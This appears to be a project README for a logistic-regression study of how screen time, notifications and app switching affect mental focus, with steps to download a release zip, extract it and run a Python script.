## 📖 Overview
This project explores how your digital behavior, including screen time, notifications, and app switching, affects your mental focus. It uses supervised learning techniques, specifically logistic regression, to analyze data and provide insights. The goal is to help users understand the relationship between their digital habits and mental performance.

## 🚀 Getting Started
Follow these simple steps to get started.

### Step 1: Ensure System Requirements
To run the application smoothly, make sure you have:

- **Operating System:** Windows, macOS, or Linux.
- **Python Version:** Python 3.6 or newer installed on your system.
- **Memory:** At least 4 GB of RAM.
- **Disk Space:** Minimum of 100 MB free space.

### Step 2: Visit the Download Page
Go to the [Releases Page](https://github.com/josechg/mental-health-digital-behavior-ML-Classification/releases) to download the application files.

### Step 3: Download the Application
Once on the releases page, find the latest version of the application and download it. Look for a file named something like `mental-health-digital-behavior-ML-Classification-v1.0.zip`. 

### Step 4: Extract the Files
After downloading, locate the `.zip` file in your downloads folder. Right-click the file and select "Extract All" or use your preferred extraction tool. This action will create a new folder containing all the necessary files.

### Step 5: Run the Application
Open the extracted folder. You will find a file named `RunApp.py`. To run the application:

1. Open a command prompt (Windows) or terminal (macOS/Linux).
2. Navigate to the folder where you extracted the files using the command line. 
   - **Example:** 
     - On Windows: `cd path\to\extracted\folder`
     - On macOS/Linux: `cd /path/to/extracted/folder`
3. Type `python RunApp.py` and press Enter. 

The application should launch, allowing you to explore data and understand how digital behavior impacts mental focus.
